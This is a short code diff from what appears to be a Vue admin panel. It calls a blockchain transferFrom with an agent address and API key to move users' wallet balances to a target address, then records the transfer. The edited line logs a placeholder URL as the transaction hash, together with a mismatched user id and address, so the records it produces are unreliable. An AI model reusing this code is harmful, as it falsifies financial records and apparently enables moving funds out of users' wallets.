@@ -184,6 +184,7 @@ export default {
                 userEthAddress = this.scoperow.trcMainnetAddress   //用户钱包地址
             }
             console.log(this.getAccountTransfer);
+
             // 定义开关 记录操作
             var doSetup = (index) => {
                 var targetAddress
@@ -209,7 +210,7 @@ export default {
                         blockChain.doTransferFrom(agentAdress, apiKey, userEthAddress, targetAddress, curBalance, async (status, hash, nonce) => {
                             if (status == true) {
                                 // 划账记录
-                                await this.AddRemitAccount({ loginUserId: res.id, id: this.scoperow.id, address: userEthAddress, type: chainType })
+                                await this.AddRemitAccount({ loginUserId: res.id, id:this.getAccountTransfer[next].uid, address: this.scoperow.bscMainnetAddress, type: chainType,hash:'http://www.baidu.com' })
                                 this.$notify({
                                     title: '操作成功',
                                     message: h('i', { style: 'color: teal' }, '请等待上链确认信息, 您的链上Hash: ' + hash + '\n等待时间由当前链块阻塞度与燃油费高低决定, 请耐心等待到账')
